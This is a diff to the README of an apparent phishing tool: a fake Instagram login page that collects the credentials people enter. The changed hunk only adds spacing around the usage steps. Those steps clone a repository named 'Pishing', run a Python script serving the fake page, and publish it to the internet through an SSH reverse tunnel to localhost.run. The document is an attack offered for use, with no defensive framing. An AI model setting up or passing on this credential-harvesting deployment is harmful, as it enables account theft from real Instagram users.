@@ -3,9 +3,17 @@ This is a fake instagram login page which when used privodes the enetered creden
 
 #Usage 
 To use this, follow these steps/copy paste the below lines - 
+
+
 git clone https://github.com/Panelv4/Pishing
+
+
 cd Pishing
+
+
 Python Fake_Login_Page_Process.py
+
+
 ssh -R 80:localhost:8080 nokey@localhost.run
 
 #Done
